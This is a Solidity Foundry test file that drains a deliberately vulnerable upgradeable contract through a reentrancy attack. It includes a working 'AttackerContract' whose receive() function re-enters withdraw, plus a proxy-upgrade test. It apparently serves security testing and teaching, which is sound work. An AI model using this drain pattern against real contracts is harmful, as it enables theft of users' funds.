// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";
import "../src/VulnerableContractV2.sol";
import "lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract VulnerableContractTest is Test {
    VulnerableContract public vulnerableContract;
    ERC1967Proxy public proxy;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = address(this);
        attacker = address(0xBEEF);

        VulnerableContract implementation = new VulnerableContract();
        proxy = new ERC1967Proxy(
            address(implementation),
            abi.encodeWithSignature("initialize()")
        );
        vulnerableContract = VulnerableContract(address(proxy));
    }

    function testReentrancy() public {
        // Fund the contract
        vulnerableContract.deposit{value: 10 ether}();

        // Create and deploy the attacker contract
        AttackerContract attackerContract = new AttackerContract(address(vulnerableContract));

        // Fund the attacker
        vm.deal(attacker, 1 ether);

        // Perform the attack
        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        // Check the result
        assertEq(address(vulnerableContract).balance, 0, "Reentrancy attack failed");
        assertGt(address(attackerContract).balance, 10 ether, "Attacker did not profit");
    }

    function testUpgrade() public {
        // Upgrade to V2
        VulnerableContractV2 implementationV2 = new VulnerableContractV2();
        vulnerableContract.upgradeTo(address(implementationV2));

        // Verify upgrade
        (bool success, bytes memory result) = address(vulnerableContract).call(
            abi.encodeWithSignature("version()")
        );
        assertEq(success, true, "Upgrade failed");
        assertEq(abi.decode(result, (string)), "V2", "Incorrect version after upgrade");
    }
}

contract AttackerContract {
    VulnerableContract public vulnerableContract;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    function attack() public payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ether to attack");
        vulnerableContract.deposit{value: ATTACK_AMOUNT}();
        vulnerableContract.withdraw(ATTACK_AMOUNT);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= ATTACK_AMOUNT) {
            vulnerableContract.withdraw(ATTACK_AMOUNT);
        }
    }
}